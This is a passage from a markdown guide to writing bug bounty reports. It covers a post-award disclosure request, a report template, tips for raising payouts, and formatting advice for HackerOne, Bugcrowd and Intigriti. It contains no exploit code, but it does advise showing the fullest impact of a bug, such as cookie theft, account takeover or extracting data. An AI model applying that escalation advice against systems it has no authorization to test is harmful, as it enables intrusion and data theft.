  ```
  :::

  :::tabs-item{icon="i-lucide-check-circle" label="After Bounty Award"}
  ```markdown
  # Thank the team and request disclosure:
  
  Hi team,
  
  Thank you for the bounty award and the professional handling 
  of this report. I appreciate the quick triage and fair assessment.
  
  I'd like to request public disclosure of this report after the 
  fix has been deployed and verified. I believe this would be 
  valuable for the security community and demonstrate your 
  commitment to security transparency.
  
  If there are any details that should be redacted before 
  disclosure, I'm happy to work with you on the appropriate 
  level of detail.
  
  Looking forward to continuing to work with your program!
  
  Best regards,
  [Your name]
  ```
  :::
::

### Report Templates

::code-collapse

```markdown [Universal Bug Bounty Report Template]
## Title
[Vulnerability Type] in [Component] via [Method] — [Impact]

## Severity
**[CRITICAL/HIGH/MEDIUM/LOW]** — CVSS [score]
CVSS Vector: `CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_`

## Summary
[2-3 sentences: What is it? Where is it? Why does it matter?]

## Affected Asset
- **URL**: [full URL]
- **Parameter**: [parameter name]
- **Endpoint**: [API endpoint]
- **Method**: [GET/POST/PUT/DELETE]

## Steps to Reproduce
1. [Exact step 1]
2. [Exact step 2]
3. [Exact step 3]
...

## Proof of Concept
[Include ONE OR MORE of:]
- curl commands
- HTTP request/response (from Burp)
- Screenshot(s)
- Video recording
- Exploit script

## Impact
[Describe the realistic worst-case scenario:]
- What data can the attacker access?
- What actions can the attacker perform?
- How many users are affected?
- What is the business impact?

## Remediation Suggestion (Optional)
[Code example or description of the fix]

## References
- [CWE link]
- [OWASP link]
- [Relevant blog posts or CVEs]

## Environment
- **Browser**: [Chrome 122, Firefox 124, etc.]
- **OS**: [Kali Linux, macOS, Windows]
- **Tools**: [Burp Suite, curl, custom script]
```

::

---

## Bounty Maximization Tips

::card-group

  :::card
  ---
  icon: i-lucide-link
  title: Chain Vulnerabilities
  ---
  Combine low-impact bugs into high-impact chains. An open redirect alone is low severity, but chained with OAuth misconfiguration becomes a critical account takeover. **Chains always pay more than individual bugs.**
  :::

  :::card
  ---
  icon: i-lucide-maximize
  title: Show Maximum Impact
  ---
  Don't stop at `alert(1)` for XSS — show cookie theft, account takeover, or admin panel compromise. Don't stop at `sleep(5)` for SQLi — extract sample data. **Demonstrated impact = higher bounty.**
  :::

  :::card
  ---
  icon: i-lucide-pen-tool
  title: Write Clearly
  ---
  A well-written report with perfect reproduction steps saves triagers time. **Faster triage = faster payout.** Triagers who enjoy reading your reports are more likely to rate severity fairly.
  :::

  :::card
  ---
  icon: i-lucide-shield
  title: Suggest Fixes
  ---
  Including remediation suggestions (especially code examples) demonstrates expertise and provides additional value. Some programs reward this with **bonus bounties or reputation points.**
  :::

  :::card
  ---
  icon: i-lucide-search
  title: Test Business Logic
  ---
  Automated scanners find injection flaws. **Business logic bugs** (race conditions, pricing manipulation, privilege escalation) are rarely found by scanners and often have higher payouts because they require human understanding.
  :::

  :::card
  ---
  icon: i-lucide-star
  title: Build Reputation
  ---
  Consistent, high-quality reports build your reputation on the platform. Higher reputation = access to **private programs** with higher bounties and less competition. **Quality over quantity always wins.**
  :::

::

---

## Platform-Specific Tips

::tabs
  :::tabs-item{icon="i-lucide-shield" label="HackerOne"}
  **Report Format Tips:**
  - Use Markdown formatting (headers, code blocks, lists)
  - Attach screenshots as inline images
  - Use the severity calculator built into the submission form
  - Reference the program's vulnerability table for expected bounty ranges
  - Add `## Impact` as a separate clearly labeled section
  - Link to your previously disclosed reports for credibility

  **Reputation Tips:**
  - Signal-to-noise ratio matters — avoid invalid/duplicate reports
  - Reputation affects private program invitations
  - `Signal` metric = (resolved reports / total reports)
  - Aim for >90% signal rate
  :::

  :::tabs-item{icon="i-lucide-bug" label="Bugcrowd"}
  **Report Format Tips:**
  - Follow the VRT (Vulnerability Rating Taxonomy) for severity
  - Bugcrowd uses P1-P5 priority instead of CVSS directly
  - Include the `Technical Severity` AND `Business Impact`
  - Use the structured submission form fields properly
  - Video PoCs are highly valued by Bugcrowd triagers

  **Priority Mapping:**
  - P1: Critical (e.g., RCE, Auth Bypass, SQLi with data)
  - P2: High (e.g., Stored XSS, IDOR, SSRF)
  - P3: Medium (e.g., CORS, CSRF, Info Disclosure)
  - P4: Low (e.g., Self-XSS, verbose errors)
  - P5: Informational (e.g., missing headers)
  :::

  :::tabs-item{icon="i-lucide-target" label="Intigriti"}
  **Report Format Tips:**
  - Include a clear `Proof of Concept` section
  - Intigriti uses CVSS v3.1 for severity
  - Be explicit about the `impact` — Intigriti triagers weight this heavily
  - Include browser/OS information for client-side bugs
  - Response times are typically 1-5 business days

  **Tips:**
  - Intigriti triage is known for being thorough — include all details upfront
  - European programs may have GDPR-specific impact considerations
  - Include compliance implications (GDPR, PSD2) when relevant
  :::
::

---

::field-group

  :::field{name="Reports Covered" type="number"}
  **10** complete, production-quality bug bounty reports across Critical, High, and Medium severity levels
  :::

  :::field{name="Vulnerability Types" type="string"}
  OAuth Misconfiguration, Java Deserialization RCE, SQL Injection, Stored XSS, SSRF, IDOR, CORS Misconfiguration, Race Condition, Subdomain Takeover, 2FA Bypass
  :::

  :::field{name="Platforms Covered" type="string"}
  HackerOne, Bugcrowd, Intigriti — with platform-specific formatting tips
  :::

  :::field{name="Total Bounty Value (Examples)" type="string"}
  $74,000 across all 10 sample reports
  :::

::

::tip
**Remember**: The difference between a $500 bounty and a $15,000 bounty is often **not** the vulnerability itself, but **how well you demonstrate its impact**. Invest time in writing clear, comprehensive reports with maximum demonstrated impact. Your report is your product — make it excellent.
::